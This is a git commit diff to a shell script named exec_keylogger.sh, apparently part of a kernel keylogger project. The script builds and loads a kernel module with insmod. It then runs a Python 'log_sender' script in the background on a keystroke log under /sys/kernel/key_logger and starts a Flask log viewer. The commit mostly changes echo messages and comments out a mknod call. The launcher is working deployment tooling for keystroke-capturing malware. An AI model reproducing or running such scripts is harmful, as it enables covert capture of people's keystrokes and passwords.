933e6a10988affd10bec8ec05b8221af7c6f6cb1
yo0x <6yonor@gmail.com>
2021-07-12 16:44:06 +0000

    fixed

--- module/exec_keylogger.sh
+++ module/exec_keylogger.sh
@@ -1,10 +1,8 @@
 #!/bin/bash
-
 #GLOBAL VARS
 #set -e
 FILE_TO_BUILD='knk-yi'
 DEVICE='keylog5'
-
 #build the module
 echo "cleaning"
 make clean
@@ -15,13 +13,12 @@ echo "Builind"
 make
 #load module & create inode
 insmod "$FILE_TO_BUILD".ko
-echo "waiting to get MAJOR"
-sleep 9s
+#echo "waiting to get MAJOR"
+echo "Creating a K-object in the background"
+sleep 3s
 #GET MAJOR MINOR
 #MAJOR=$(ls -ln keylog5 \| cut -d \' \' -f 5 \| sed -r \'s/[,]+/ /g\')
-mknod "$DEVICE" c 244 0
-
-
+#mknod "$DEVICE" c 244 0
 #run python on background
 echo "Installing portable conda Env"
 mkdir ../myenv
@@ -30,11 +27,11 @@ source ../myenv/bin/activate
 pip install -r ../BE/requeriments.txt
 pip install python-dotenv
 pip install flask
-echo "Running BackEnd script in: "
+echo "Running BackEnd script in (SERVER SIDE): "
 echo $(which python)
 $(which python) ../BE/log_sender.py -f "/sys/kernel/key_logger/keyLog"  -t 5 &
 sleep 5s
-echo "Running frotEnd logs viewer"
+echo "Running frotEnd logs viewer (USER SIDE): " 
 export FLASK_ENV=development
 export FLASK_APP=../FE/main.py
 flask run &
